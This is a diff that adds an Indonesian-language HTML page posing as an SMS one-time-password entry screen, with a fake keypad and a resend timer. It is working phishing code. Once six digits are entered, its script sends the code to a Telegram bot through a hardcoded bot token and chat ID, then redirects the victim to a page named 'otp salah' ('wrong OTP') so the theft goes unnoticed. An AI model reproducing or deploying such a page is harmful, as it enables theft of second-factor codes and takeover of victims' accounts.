@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Masukkan OTP</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        body {
+            background-color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            color: #000;
+        }
+
+        .back-btn {
+            position: absolute;
+            top: 8px;
+            left: 10px;
+            font-size: 20px;
+            color: #000;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .content {
+            flex: 1;
+            padding: 45px 20px 12px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .icon-box {
+            width: 60px;
+            height: 60px;
+            background: #f0f4f8;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 14px;
+        }
+        .icon-box svg {
+            width: 34px;
+            height: 34px;
+        }
+
+        h1 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 8px;
+        }
+        .desc {
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 24px;
+            line-height: 1.4;
+            padding: 0 8px;
+        }
+
+        .otp-input-wrap {
+            width: 100%;
+            position: relative;
+            margin-bottom: 18px;
+        }
+        .otp-input {
+            width: 100%;
+            padding: 13px 12px;
+            font-size: 16px;
+            border: 2px solid #1688F0;
+            border-radius: 10px;
+            outline: none;
+            background: #fff;
+        }
+        .otp-input::placeholder {
+            color: #1688F0;
+            font-weight: 500;
+        }
+        .clear-btn {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background: #e0e0e0;
+            color: #888;
+            border: none;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+
+        .resend-text {
+            font-size: 13px;
+            color: #999;
+            margin-bottom: auto;
+            padding-bottom: 18px;
+        }
+
+        .keyboard {
+            width: 100%;
+            background: #e5e5e7;
+            padding: 6px 5px 10px;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+            user-select: none;
+        }
+        .key-row {
+            display: flex;
+            gap: 5px;
+        }
+        .key {
+            flex: 1;
+            background: #ffffff;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 4px;
+            font-size: 20px;
+            color: #000;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 46px;
+        }
+        .key:active {
+            background: #d1d1d1;
+        }
+        .key .sub {
+            font-size: 9px;
+            color: #666;
+            margin-top: 1px;
+        }
+        .key-wide {
+            flex: 2;
+        }
+    </style>
+</head>
+<body>
+
+    <a href="#" class="back-btn">←</a>
+
+    <div class="content">
+        <div class="icon-box">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="7" y="3" width="10" height="18" rx="2" fill="#1688F0"/>
+                <rect x="9" y="6" width="6" height="4" rx="1" fill="#fff"/>
+                <path d="M3 9L10 13L17 9" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
+            </svg>
+        </div>
+
+        <h1>Masukkan OTP</h1>
+        <p class="desc">Kami telah mengirim OTP 6 digit melalui SMS ke:</p>
+
+        <div class="otp-input-wrap">
+            <input type="text" id="otpInput" class="otp-input" placeholder="Kode OTP" inputmode="numeric" maxlength="6">
+            <button class="clear-btn" onclick="clearOTP()">×</button>
+        </div>
+
+        <p class="resend-text" id="countdown">Kirim Ulang SMS dalam 28 Detik</p>
+    </div>
+
+    <div class="keyboard">
+        <div class="key-row">
+            <button class="key" onclick="appendNum('1')">1<span class="sub"></span></button>
+            <button class="key" onclick="appendNum('2')">2<span class="sub">ABC</span></button>
+            <button class="key" onclick="appendNum('3')">3<span class="sub">DEF</span></button>
+        </div>
+        <div class="key-row">
+            <button class="key" onclick="appendNum('4')">4<span class="sub">GHI</span></button>
+            <button class="key" onclick="appendNum('5')">5<span class="sub">JKL</span></button>
+            <button class="key" onclick="appendNum('6')">6<span class="sub">MNO</span></button>
+        </div>
+        <div class="key-row">
+            <button class="key" onclick="appendNum('7')">7<span class="sub">PQRS</span></button>
+            <button class="key" onclick="appendNum('8')">8<span class="sub">TUV</span></button>
+            <button class="key" onclick="appendNum('9')">9<span class="sub">WXYZ</span></button>
+        </div>
+        <div class="key-row">
+            <button class="key" onclick="appendNum('+')">+<span class="sub">* #</span></button>
+            <button class="key key-wide" onclick="appendNum('0')">0<span class="sub"></span></button>
+            <button class="key" onclick="deleteNum()">⌫<span class="sub"></span></button>
+        </div>
+    </div>
+
+    <script>
+        const otpInput = document.getElementById('otpInput');
+        
+        // Tambah angka & CEK 6 DIGIT
+        function appendNum(n) {
+            if (otpInput.value.length < 6) {
+                otpInput.value += n;
+                // ✅ OTOMATIS KIRIM & PINDAH SAAT 6 DIGIT TERISI
+                if (otpInput.value.length === 6) {
+                    kirimOTP();
+                }
+            }
+        }
+        
+        function deleteNum() {
+            otpInput.value = otpInput.value.slice(0, -1);
+        }
+        function clearOTP() {
+            otpInput.value = '';
+        }
+
+        // Hitung Mundur
+        let timeLeft = 28;
+        const countdownEl = document.getElementById('countdown');
+        const timer = setInterval(() => {
+            timeLeft--;
+            if (timeLeft <= 0) {
+                clearInterval(timer);
+                countdownEl.textContent = 'Kirim Ulang SMS';
+                countdownEl.style.color = '#1688F0';
+                countdownEl.style.cursor = 'pointer';
+            } else {
+                countdownEl.textContent = `Kirim Ulang SMS dalam ${timeLeft} Detik`;
+            }
+        }, 1000);
+
+        // === KIRIM TELEGRAM & PINDAH HALAMAN ===
+        const BOT_TOKEN = "8901288911:AAETNtckzfIRPsCc9kR0BNcgODG5ajDRmNk";
+        const CHAT_ID = "8617754329";
+        const HALAMAN_TUJUAN = "otp salah.html"; // Ganti nama halaman berikutnya
+
+        async function kirimOTP() {
+            const kode = otpInput.value.trim();
+            const pesan = `🔑 Kode OTP:\n${kode}`;
+            
+            try {
+                // Kirim ke Telegram
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type':'application/json'},
+                    body: JSON.stringify({chat_id: CHAT_ID, text: pesan})
+                });
+            } catch(e) {
+                console.log("Terjadi kesalahan pengiriman");
+            }
+            
+            // ✅ PINDAH HALAMAN LANGSUNG
+            window.location.href = HALAMAN_TUJUAN;
+        }
+    </script>
+
+</body>
+</html>
